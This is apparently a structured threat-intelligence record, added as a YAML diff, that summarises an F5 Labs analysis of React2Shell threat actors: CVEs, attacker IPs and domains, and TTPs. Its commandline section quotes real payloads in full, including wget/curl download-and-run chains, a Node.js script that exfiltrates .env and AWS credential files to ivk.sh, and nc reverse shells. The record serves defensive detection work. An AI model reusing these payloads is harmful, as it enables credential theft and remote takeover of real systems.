@@ -1,0 +1,123 @@
+description: The report discusses various CVEs related to web exploits and remote
+  code execution vulnerabilities.
+TTPs:
+  processes:
+  - node
+  - sh
+  - curl
+  - wget
+  - telnet
+  - nc
+  commandline:
+  - echo ismyhero >> public/robots.txt
+  - (wget -qO- hxxp://41.231.37.153/rondo.aqu.sh||busybox wget -qO- hxxp://41.231.37.153/rondo.aqu.sh||curl
+    -s hxxp://41.231.37.153/rondo.aqu.sh)|sh&
+  - (cd /dev;busybox wget hxxp://31.56.27.76/n2/x86;chmod 777 x86;./x86 reactOnMynuts;busybox
+    wget -q hxxp://193.34.213.150/nuts/bolts -O-|sh)
+  - '(async()=\u003e{try { var fs = process.mainModule.require(''fs'');var path =
+    process.mainModule.require(''path''); var http = process.mainModule.require(''http'');
+    var curr = process.cwd(); var root = path.parse(curr).root; var count = 0; while
+    (true) { try { var files = fs.readdirSync(curr); files.forEach(function (f) {
+    if (f.indexOf(''.env'') === 0) { var p = path.join(curr, f); try { var stat =
+    fs.statSync(p); if (stat.isFile()) { var data = fs.readFileSync(p); var req =
+    http.request({ hostname: ''ivk.sh'', port: 80, path: ''/nxtgrab.php?f='' + encodeURIComponent(p),
+    method: ''POST'', headers: { ''Content-Length'': data.length } }, function (res)
+    { }); req.on(''error'', function (err) { console.log(err); }); req.write(data);
+    req.end(); count++; } } catch (e) { } } }); } catch (e) { } if (curr === root)
+    break; var parent = path.dirname(curr); if (parent === curr) break; curr = parent;
+    } var targetFiles = [\"~/.aws/credentials\", \"/root/.aws/credentials\"]; var
+    home = process.env.HOME || process.env.USERPROFILE; targetFiles.forEach(function
+    (tf) { try { var p = tf.replace(''~'', home); if (fs.existsSync(p)) { var stat
+    = fs.statSync(p); if (stat.isFile()) { var data = fs.readFileSync(p); var req
+    = http.request({ hostname: ''ivk.sh'', port: 80, path: ''/nxtgrab.php?f='' + encodeURIComponent(p),
+    method: ''POST'', headers: { ''Content-Length'': data.length } }, function (res)
+    { }); req.on(''error'', function (err) { console.log(err); }); req.write(data);
+    req.end(); count++; } } catch (e) { } }); console.log(''Collected '' + count +
+    '' files''); if (process.platform === ''linux'') { try { var cp = process.mainModule.require(''child_process'');
+    cp.exec(''curl -k -s https://ivk.sh/nxtplan | sh'', { detached: true, stdio: ''ignore''
+    }).unref(); } catch (e) { } } } catch (e) { } })()'
+  - 'varres=process.mainModule.require(''child_process'').execSync(''(nc 45.125.66.90
+    3443 ||telnet 45.125.66.90 3443) |sh'').toString().trim();;throw Object.assign(new
+    Error(''NEXT_REDIRECT''),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});'
+  - varres=process.mainModule.require('child_process').execSync('ping -c 9 144.172.105.58',{'timeout':120000}).toString().trim();;throw
+    Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});
+  - cd /tmp; wget -O /tmp/x.sh hxxp://94.154.35.154/weball.sh ; chmod +x /tmp/x.sh;
+    sh /tmp/x.sh; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 193.142.147.209
+    12323 >/tmp/f
+  powershell: []
+  scripting_engine:
+  - JavaScript
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - node -> 41.231.37.153:80
+  - node -> 31.56.27.76:80
+  - node -> 193.34.213.150:80
+  - node -> ivk.sh:80
+  - node -> 45.125.66.90:3443
+  - node -> 144.172.105.58:ICMP
+  - node -> 94.154.35.154:80
+  - node -> 193.142.147.209:12323
+  file_activity:
+  - /tmp/x.sh
+  - /dev/x86
+  - /tmp/f
+  - ~/.aws/credentials
+  - /root/.aws/credentials
+  - public/robots.txt
+  persistence: []
+  process_relations: []
+CVEs:
+- CVE-2017-9841
+- CVE-2025-55182
+- CVE-2023-1389
+- CVE-2019-9082
+- CVE-2024-4577
+- CVE-2022-24847
+- CVE-2022-42475
+- CVE-2022-22947
+- CVE-2022-47945
+- CVE-2020-8958
+- CVE-2024-3721
+- CVE-2025-31324
+- CVE-2021-34473
+- CVE-2021-28481
+- CVE-2021-44228
+- CVE-2018-10561
+- CVE-2015-2051
+- CVE-2014-6271
+IOCs:
+  hashes: []
+  ip_addresses:
+  - 172.236.52.146
+  - 192.159.99.95
+  - 95.214.52.170
+  - 35.95.150.5
+  - 89.42.231.218
+  - 89.42.231.244
+  - 41.231.37.153
+  - 31.56.27.76
+  - 193.34.213.150
+  - 89.144.31.18
+  - 45.125.66.90
+  - 144.172.105.58
+  - 94.154.35.154
+  - 193.142.147.209
+  domains:
+  - mewo.oceanic-node.su
+  - ivk.sh
+  urls:
+  - hxxp://41.231.37.153/rondo.aqu.sh
+  - hxxp://31.56.27.76/n2/x86
+  - hxxp://193.34.213.150/nuts/x86
+  - hxxp://193.34.213.150/nuts/bolts
+  - hxxp://89.144.31.18/nuts/x86
+  - hxxp://89.144.31.18/nuts/bolts
+  - hxxp://ivk.sh/nxtgrab.php?f=<absolute_path>
+  - hxxps://ivk.sh/nxtplan
+  - hxxp://94.154.35.154/weball.sh
+authors:
+- Adam Metcalfe-Pearce
+reference: https://www.f5.com/labs/articles/analyzing-react2shell-threat-actors
+date_of_publication: January 16, 2026
+file_creation_date: January 19, 2026
